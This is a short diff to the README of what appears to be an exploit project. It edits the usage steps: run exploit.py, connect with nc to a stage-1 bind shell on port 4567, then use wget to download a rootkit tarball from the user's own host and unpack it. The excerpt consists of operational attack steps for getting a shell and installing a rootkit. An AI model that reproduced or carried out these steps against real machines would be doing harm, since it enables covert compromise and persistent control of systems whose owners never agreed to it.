@@ -87,10 +87,10 @@ python3 exploit.py
 ```
 
 2. in a separate terminal connect to localhost:4567 via `nc` (stage 1 bind shell)
-3. download and unzip your tarball
+3. download and unzip your tarball. To find your local IP address, run `ifconfig` and copy and paste the first IP address.
 
 ```sh
-wget http://127.0.0.1/rootkit.tz
+wget http://<your_ip_address>/rootkit.tz
 tar -xzf rootkit.tz
 ```
 
